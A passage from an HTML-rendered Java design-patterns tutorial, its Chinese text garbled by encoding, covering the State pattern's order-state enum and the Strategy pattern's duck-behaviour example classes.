class="hljs-comment">     * ä»˜æ¬¾</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">void</span> <span class="hljs-title function_">payOrderEvent</span><span class="hljs-params">(Context context)</span>;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * æ¥å•æœ‰äººæ”¯ä»˜å¤±æ•ˆ</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">void</span> <span class="hljs-title function_">orderFailureEvent</span><span class="hljs-params">(Context context)</span>;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * åé¦ˆ</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">void</span> <span class="hljs-title function_">feedBackEvent</span><span class="hljs-params">(Context context)</span>;<br><br><br>    String <span class="hljs-title function_">getCurrentState</span><span class="hljs-params">()</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>StateEnum.java</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.state.money;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * çŠ¶æ€æšä¸¾ç±»</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@author</span> Administrator</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">enum</span> <span class="hljs-title class_">StateEnum</span> &#123;<br><br>    <span class="hljs-comment">//è®¢å•ç”Ÿæˆ</span><br>    GENERATE(<span class="hljs-number">1</span>, <span class="hljs-string">&quot;GENERATE&quot;</span>),<br><br>    <span class="hljs-comment">//å·²å®¡æ ¸</span><br>    REVIEWED(<span class="hljs-number">2</span>, <span class="hljs-string">&quot;REVIEWED&quot;</span>),<br><br>    <span class="hljs-comment">//å·²å‘å¸ƒ</span><br>    PUBLISHED(<span class="hljs-number">3</span>, <span class="hljs-string">&quot;PUBLISHED&quot;</span>),<br><br>    <span class="hljs-comment">//å¾…ä»˜æ¬¾</span><br>    NOT_PAY(<span class="hljs-number">4</span>, <span class="hljs-string">&quot;NOT_PAY&quot;</span>),<br><br>    <span class="hljs-comment">//å·²ä»˜æ¬¾</span><br>    PAID(<span class="hljs-number">5</span>, <span class="hljs-string">&quot;PAID&quot;</span>),<br><br>    <span class="hljs-comment">//å·²å®Œç»“</span><br>    FEED_BACKED(<span class="hljs-number">6</span>, <span class="hljs-string">&quot;FEED_BACKED&quot;</span>);<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> key;<br>    <span class="hljs-keyword">private</span> String value;<br><br>    StateEnum(<span class="hljs-type">int</span> key, String value) &#123;<br>        <span class="hljs-built_in">this</span>.key = key;<br>        <span class="hljs-built_in">this</span>.value = value;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getKey</span><span class="hljs-params">()</span> &#123;<span class="hljs-keyword">return</span> key;&#125;<br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getValue</span><span class="hljs-params">()</span> &#123;<span class="hljs-keyword">return</span> value;&#125;<br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>æ‰§è¡Œç¨‹åºï¼Œè¾“å‡ºç»“æœï¼š</p></blockquote><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs ada">å½“å‰çŠ¶æ€ : <span class="hljs-type">PUBLISHED</span><br>PUBLISHED<br>å½“å‰çŠ¶æ€ : <span class="hljs-type">NOT_PAY</span><br>å½“å‰çŠ¶æ€ : <span class="hljs-type">PAID</span><br></code></pre></td></tr></table></figure><h2 id="çŠ¶æ€æ¨¡å¼çš„æ³¨æ„äº‹é¡¹å’Œç»†èŠ‚"><a class="markdownIt-Anchor" href="#çŠ¶æ€æ¨¡å¼çš„æ³¨æ„äº‹é¡¹å’Œç»†èŠ‚"></a> çŠ¶æ€æ¨¡å¼çš„æ³¨æ„äº‹é¡¹å’Œç»†èŠ‚</h2><ol><li><p>ä»£ç æœ‰å¾ˆå¼ºçš„<strong>å¯è¯»æ€§</strong>ã€‚çŠ¶æ€æ¨¡å¼å°†æ¯ä¸ªçŠ¶æ€çš„è¡Œä¸ºå°è£…åˆ°å¯¹åº”çš„ä¸€ä¸ªç±»ä¸­</p></li><li><p><strong>æ–¹ä¾¿ç»´æŠ¤</strong>ã€‚å°†å®¹æ˜“äº§ç”Ÿé—®é¢˜çš„ if-else è¯­å¥åˆ é™¤äº†ï¼Œå¦‚æœæŠŠæ¯ä¸ªçŠ¶æ€çš„è¡Œä¸ºéƒ½æ”¾åˆ°ä¸€ä¸ªç±»ä¸­ï¼Œæ¯æ¬¡è°ƒç”¨æ–¹æ³•æ—¶éƒ½è¦åˆ¤æ–­å½“å‰æ˜¯ä»€ä¹ˆçŠ¶æ€ï¼Œä¸ä½†ä¼šäº§å‡ºå¾ˆå¤š if-else è¯­å¥ï¼Œè€Œä¸”å®¹æ˜“å‡ºé”™</p></li><li><p>ç¬¦åˆâ€œå¼€é—­åŸåˆ™â€ã€‚å®¹æ˜“å¢åˆ çŠ¶æ€</p></li><li><p>ä¼šäº§ç”Ÿå¾ˆå¤šç±»ã€‚æ¯ä¸ªçŠ¶æ€éƒ½è¦ä¸€ä¸ªå¯¹åº”çš„ç±»ï¼Œå½“çŠ¶æ€è¿‡å¤šæ—¶ä¼šäº§ç”Ÿå¾ˆå¤šç±»ï¼ŒåŠ å¤§ç»´æŠ¤éš¾åº¦</p></li><li><p>åº”ç”¨åœºæ™¯ï¼šå½“ä¸€ä¸ªäº‹ä»¶æˆ–è€…å¯¹è±¡æœ‰å¾ˆå¤šç§çŠ¶æ€ï¼ŒçŠ¶æ€ä¹‹é—´ä¼šç›¸äº’è½¬æ¢ï¼Œå¯¹ä¸åŒçš„çŠ¶æ€è¦æ±‚æœ‰ä¸åŒçš„è¡Œä¸ºçš„æ—¶å€™ï¼Œå¯ä»¥è€ƒè™‘ä½¿ç”¨çŠ¶æ€æ¨¡å¼</p></li></ol><h1 id="ç­–ç•¥æ¨¡å¼"><a class="markdownIt-Anchor" href="#ç­–ç•¥æ¨¡å¼"></a> <mark>ç­–ç•¥æ¨¡å¼</mark></h1><p>åœ¨ç­–ç•¥æ¨¡å¼ï¼ˆStrategy Patternï¼‰ä¸­ï¼Œä¸€ä¸ªç±»çš„è¡Œä¸ºæˆ–å…¶ç®—æ³•å¯ä»¥åœ¨è¿è¡Œæ—¶æ›´æ”¹ã€‚è¿™ç§ç±»å‹çš„è®¾è®¡æ¨¡å¼å±äºè¡Œä¸ºå‹æ¨¡å¼ã€‚</p><h2 id="ä»‹ç»-21"><a class="markdownIt-Anchor" href="#ä»‹ç»-21"></a> ä»‹ç»</h2><p><strong>æ„å›¾ï¼š</strong> å®šä¹‰ä¸€ç³»åˆ—çš„ç®—æ³•,æŠŠå®ƒä»¬ä¸€ä¸ªä¸ªå°è£…èµ·æ¥, å¹¶ä¸”ä½¿å®ƒä»¬å¯ç›¸äº’æ›¿æ¢ã€‚</p><p><strong>ä¸»è¦è§£å†³ï¼š</strong> åœ¨æœ‰å¤šç§ç®—æ³•ç›¸ä¼¼çš„æƒ…å†µä¸‹ï¼Œä½¿ç”¨ ifâ€¦else æ‰€å¸¦æ¥çš„å¤æ‚å’Œéš¾ä»¥ç»´æŠ¤ã€‚</p><p><strong>ä½•æ—¶ä½¿ç”¨ï¼š</strong> ä¸€ä¸ªç³»ç»Ÿæœ‰è®¸å¤šè®¸å¤šç±»ï¼Œè€ŒåŒºåˆ†å®ƒä»¬çš„åªæ˜¯ä»–ä»¬ç›´æ¥çš„è¡Œä¸ºã€‚</p><p><strong>å¦‚ä½•è§£å†³ï¼š</strong> å°†è¿™äº›ç®—æ³•å°è£…æˆä¸€ä¸ªä¸€ä¸ªçš„ç±»ï¼Œä»»æ„åœ°æ›¿æ¢ã€‚</p><p><strong>å…³é”®ä»£ç ï¼š</strong> å®ç°åŒä¸€ä¸ªæ¥å£ã€‚</p><p><strong>åº”ç”¨å®ä¾‹ï¼š</strong> 1ã€è¯¸è‘›äº®çš„é”¦å›Šå¦™è®¡ï¼Œæ¯ä¸€ä¸ªé”¦å›Šå°±æ˜¯ä¸€ä¸ªç­–ç•¥ã€‚ 2ã€æ—…è¡Œçš„å‡ºæ¸¸æ–¹å¼ï¼Œé€‰æ‹©éª‘è‡ªè¡Œè½¦ã€åæ±½è½¦ï¼Œæ¯ä¸€ç§æ—…è¡Œæ–¹å¼éƒ½æ˜¯ä¸€ä¸ªç­–ç•¥ã€‚ 3ã€JAVA AWT ä¸­çš„ LayoutManagerã€‚</p><p><strong>ä¼˜ç‚¹ï¼š</strong> 1ã€ç®—æ³•å¯ä»¥è‡ªç”±åˆ‡æ¢ã€‚ 2ã€é¿å…ä½¿ç”¨å¤šé‡æ¡ä»¶åˆ¤æ–­ã€‚ 3ã€æ‰©å±•æ€§è‰¯å¥½ã€‚</p><p><strong>ç¼ºç‚¹ï¼š</strong> 1ã€ç­–ç•¥ç±»ä¼šå¢å¤šã€‚ 2ã€æ‰€æœ‰ç­–ç•¥ç±»éƒ½éœ€è¦å¯¹å¤–æš´éœ²ã€‚</p><p><strong>ä½¿ç”¨åœºæ™¯ï¼š</strong> 1ã€å¦‚æœåœ¨ä¸€ä¸ªç³»ç»Ÿé‡Œé¢æœ‰è®¸å¤šç±»ï¼Œå®ƒä»¬ä¹‹é—´çš„åŒºåˆ«ä»…åœ¨äºå®ƒä»¬çš„è¡Œä¸ºï¼Œé‚£ä¹ˆä½¿ç”¨ç­–ç•¥æ¨¡å¼å¯ä»¥åŠ¨æ€åœ°è®©ä¸€ä¸ªå¯¹è±¡åœ¨è®¸å¤šè¡Œä¸ºä¸­é€‰æ‹©ä¸€ç§è¡Œä¸ºã€‚<br />2ã€ä¸€ä¸ªç³»ç»Ÿéœ€è¦åŠ¨æ€åœ°åœ¨å‡ ç§ç®—æ³•ä¸­é€‰æ‹©ä¸€ç§ã€‚ 3ã€å¦‚æœä¸€ä¸ªå¯¹è±¡æœ‰å¾ˆå¤šçš„è¡Œä¸ºï¼Œå¦‚æœä¸ç”¨æ°å½“çš„æ¨¡å¼ï¼Œè¿™äº›è¡Œä¸ºå°±åªå¥½ä½¿ç”¨å¤šé‡çš„æ¡ä»¶é€‰æ‹©è¯­å¥æ¥å®ç°ã€‚</p><p><strong>æ³¨æ„äº‹é¡¹ï¼š</strong> å¦‚æœä¸€ä¸ªç³»ç»Ÿçš„ç­–ç•¥å¤šäºå››ä¸ªï¼Œå°±éœ€è¦è€ƒè™‘ä½¿ç”¨æ··åˆæ¨¡å¼ï¼Œè§£å†³ç­–ç•¥ç±»è†¨èƒ€çš„é—®é¢˜ã€‚</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230105165911040.png" alt="image-20230105165911040" /></p><p>ä»ä¸Šå›¾å¯ä»¥çœ‹åˆ°ï¼Œå®¢æˆ· context æœ‰æˆå‘˜å˜é‡ strategy æˆ–è€…å…¶ä»–çš„ç­–ç•¥æ¥å£,è‡³äºéœ€è¦ä½¿ç”¨åˆ°å“ªä¸ªç­–ç•¥ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨æ„é€ å™¨ä¸­æŒ‡å®š</p><h2 id="å®ç°-19"><a class="markdownIt-Anchor" href="#å®ç°-19"></a> å®ç°</h2><ol><li>åº”ç”¨å®ä¾‹è¦æ±‚</li></ol><p>â€‹1) æœ‰å„ç§é¸­å­(æ¯”å¦‚ é‡é¸­ã€åŒ—äº¬é¸­ã€æ°´é¸­ç­‰ï¼Œ é¸­å­æœ‰å„ç§è¡Œä¸ºï¼Œæ¯”å¦‚ å«ã€é£è¡Œç­‰)</p><p>â€‹2) æ˜¾ç¤ºé¸­å­çš„ä¿¡æ¯</p><p>ç¼–å†™ç¨‹åºå®Œæˆå‰é¢çš„é¸­å­é¡¹ç›®ï¼Œè¦æ±‚ä½¿ç”¨ç­–ç•¥æ¨¡å¼</p><ol start="2"><li>æ€è·¯åˆ†æ(ç±»å›¾)</li></ol><p>ç­–ç•¥æ¨¡å¼ï¼šåˆ†åˆ«å°è£…è¡Œä¸ºæ¥å£ï¼Œå®ç°ç®—æ³•æ—ï¼Œè¶…ç±»é‡Œæ”¾è¡Œä¸ºæ¥å£å¯¹è±¡ï¼Œåœ¨å­ç±»é‡Œå…·ä½“è®¾å®šè¡Œä¸ºå¯¹è±¡ã€‚åŸåˆ™å°±æ˜¯ï¼šåˆ†ç¦»å˜åŒ–éƒ¨åˆ†ï¼Œå°è£…æ¥å£ï¼ŒåŸºäºæ¥å£ç¼–ç¨‹å„ç§åŠŸèƒ½ã€‚æ­¤æ¨¡å¼è®©è¡Œä¸ºçš„å˜åŒ–ç‹¬ç«‹äºç®—æ³•çš„ä½¿ç”¨è€…</p><p>ä¼ ç»Ÿæ¨¡å¼ç±»å›¾ï¼š</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230105170757994.png" alt="image-20230105170757994" /></p><p><code>Client.java</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.strategy;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Client</span> &#123;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br><span class="hljs-comment">// TODO Auto-generated method stub</span><br><span class="hljs-comment">//æµ‹è¯•</span><br><span class="hljs-keyword">new</span> <span class="hljs-title class_">PekingDuck</span>().fly();<br><span class="hljs-keyword">new</span> <span class="hljs-title class_">WildDuck</span>().fly();<br><span class="hljs-keyword">new</span> <span class="hljs-title class_">ToyDuck</span>().fly();<br><span class="hljs-comment">//ToyDuckæ²¡æœ‰é£è¡Œèƒ½åŠ›</span><br>&#125;<br><br>&#125;<br><br></code></pre></td></tr></table></figure><p><code>Duck.java</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.strategy;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">abstract</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Duck</span> &#123;<br><br>   <span class="hljs-keyword">public</span> <span class="hljs-title function_">Duck</span><span class="hljs-params">()</span> &#123;<br>   <br>   &#125;<br><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">abstract</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">display</span><span class="hljs-params">()</span>;<span class="hljs-comment">//æ˜¾ç¤ºé¸­å­ä¿¡æ¯</span><br>   <br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">quack</span><span class="hljs-params">()</span> &#123;<br>      System.out.println(<span class="hljs-string">&quot;é¸­å­å˜å˜å«~~&quot;</span>);<br>   &#125;<br>   <br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">swim</span><span class="hljs-params">()</span> &#123;<br>      System.out.println(<span class="hljs-string">&quot;é¸­å­ä¼šæ¸¸æ³³~~&quot;</span>);<br>   &#125;<br>   <br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">fly</span><span class="hljs-params">()</span> &#123;<br>      System.out.println(<span class="hljs-string">&quot;é¸­å­ä¼šé£ç¿”~~~&quot;</span>);<br>   &#125;<br>   <br>&#125;<br></code></pre></td></tr></table></figure><p><code>PekingDuck.java</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.strategy;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">PekingDuck</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Duck</span> &#123;<br><br>   <span class="hljs-meta">@Override</span><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">display</span><span class="hljs-params">()</span> &#123;<br>      <span class="hljs-comment">// TODO Auto-generated method stub</span><br>      System.out.println(<span class="hljs-string">&quot;~~åŒ—äº¬é¸­~~~&quot;</span>);<br>   &#125;<br>   <br>   <span class="hljs-comment">//å› ä¸ºåŒ—äº¬é¸­ä¸èƒ½é£ç¿”ï¼Œå› æ­¤éœ€è¦é‡å†™fly</span><br>   <span class="hljs-meta">@Override</span><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">fly</span><span class="hljs-params">()</span> &#123;<br>      <span class="hljs-comment">// TODO Auto-generated method stub</span><br>      System.out.println(<span class="hljs-string">&quot;åŒ—äº¬é¸­ä¸èƒ½é£ç¿”&quot;</span>);<br>   &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p><code>ToyDuck.java</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.strategy;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ToyDuck</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Duck</span>&#123;<br><br>   <span class="hljs-meta">@Override</span><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">display</span><span class="hljs-params">()</span> &#123;<br>      <span class="hljs-comment">// TODO Auto-generated method stub</span><br>      System.out.println(<span class="hljs-string">&quot;ç©å…·é¸­&quot;</span>);<br>   &#125;<br><br>   <span class="hljs-comment">//éœ€è¦é‡å†™çˆ¶ç±»çš„æ‰€æœ‰æ–¹æ³•</span><br>   <br>   <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">quack</span><span class="hljs-params">()</span> &#123;<br>      System.out.println(<span class="hljs-string">&quot;ç©å…·é¸­ä¸èƒ½å«~~&quot;</span>);<br>   &#125;<br>   <br>   <span class="hljs-meta">@Override</span><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">swim</span><span class="hljs-params">()</span> &#123;<br>      System.out.println(<span class="hljs-string">&quot;ç©å…·é¸­ä¸ä¼šæ¸¸æ³³~~&quot;</span>);<br>   &#125;<br>   <br>   <span class="hljs-meta">@Override</span><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">fly</span><span class="hljs-params">()</span> &#123;<br>      System.out.println(<span class="hljs-string">&quot;ç©å…·é¸­ä¸ä¼šé£ç¿”~~~&quot;</span>);<br>   &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>WildDuck.java</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.strategy;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">WildDuck</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Duck</span> &#123;<br><br>   <span class="hljs-meta">@Override</span><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">display</span><span class="hljs-params">()</span> &#123;<br>      <span class="hljs-comment">// TODO Auto-generated method stub</span><br>      System.out.println(<span class="hljs-string">&quot; è¿™æ˜¯é‡é¸­ &quot;</span>);<br>   &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>æ‰§è¡Œç¨‹åºï¼Œè¾“å‡ºç»“æœï¼š</p></blockquote><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs markdown">åŒ—äº¬é¸­ä¸èƒ½é£ç¿”<br>é¸­å­ä¼šé£ç¿”<span class="hljs-code">~~~</span><br><span class="hljs-code">ç©å…·é¸­ä¸ä¼šé£ç¿”~~~</span><br></code></pre></td></tr></table></figure><p>ç­–ç•¥æ¨¡å¼ç±»å›¾ï¼š</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230105165733894.png" alt="" /></p><p><code>BadFlyBehavior.java</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.strategy.improve;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">BadFlyBehavior</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">FlyBehavior</span> &#123;<br><br>   <span class="hljs-meta">@Override</span><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">fly</span><span class="hljs-params">()</span> &#123;<br>      <span class="hljs-comment">// TODO Auto-generated method stub</span><br>      System.out.println(<span class="hljs-string">&quot; é£ç¿”æŠ€æœ¯ä¸€èˆ¬ &quot;</span>);<br>   &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p><code>Client.java</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.strategy.improve;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Client</span> &#123;<br><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>      <span class="hljs-comment">// TODO Auto-generated method stub</span><br>      <span class="hljs-type">WildDuck</span> <span class="hljs-variable">wildDuck</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">WildDuck</span>();<br>      wildDuck.fly();<span class="hljs-comment">//</span><br>      <br>      <span class="hljs-type">ToyDuck</span> <span class="hljs-variable">toyDuck</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ToyDuck</span>();<br>      toyDuck.fly();<br>      <br>      <span class="hljs-type">PekingDuck</span> <span class="hljs-variable">pekingDuck</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PekingDuck</span>();<br>      pekingDuck.fly();<br>      <br>      <span class="hljs-comment">//åŠ¨æ€æ”¹å˜æŸä¸ªå¯¹è±¡çš„è¡Œä¸º, åŒ—äº¬é¸­ ä¸èƒ½é£</span><br>      pekingDuck.setFlyBehavior(<span class="hljs-keyword">new</span> <span class="hljs-title class_">NoFlyBehavior</span>());<br>      System.out.println(<span class="hljs-string">&quot;åŒ—äº¬é¸­çš„å®é™…é£ç¿”èƒ½åŠ›&quot;</span>);<br>      pekingDuck.fly();<br>   &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p><code>Duck.java</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.strategy.improve;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">abstract</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Duck</span> &#123;<br><br>    <span class="hljs-comment">//å±æ€§, ç­–ç•¥æ¥å£</span><br>    FlyBehavior flyBehavior;<br>    <span class="hljs-comment">//å…¶å®ƒå±æ€§&lt;-&gt;ç­–ç•¥æ¥å£</span><br>    QuackBehavior quackBehavior;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Duck</span><span class="hljs-params">()</span> &#123;<br><br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">abstract</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">display</span><span class="hljs-params">()</span>;<span class="hljs-comment">//æ˜¾ç¤ºé¸­å­ä¿¡æ¯</span><br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">quack</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;é¸­å­å˜å˜å«~~&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">swim</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;é¸­å­ä¼šæ¸¸æ³³~~&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">fly</span><span class="hljs-params">()</span> &#123;<br><br>      display();<br>        <span class="hljs-comment">//æ”¹è¿›</span><br>        <span class="hljs-keyword">if</span> (flyBehavior != <span class="hljs-literal">null</span>) &#123;<br>            flyBehavior.fly();<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setFlyBehavior</span><span class="hljs-params">(FlyBehavior flyBehavior)</span> &#123;<br>        <span class="hljs-built_in">this</span>.flyBehavior = flyBehavior;<br>    &#125;<br><br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> 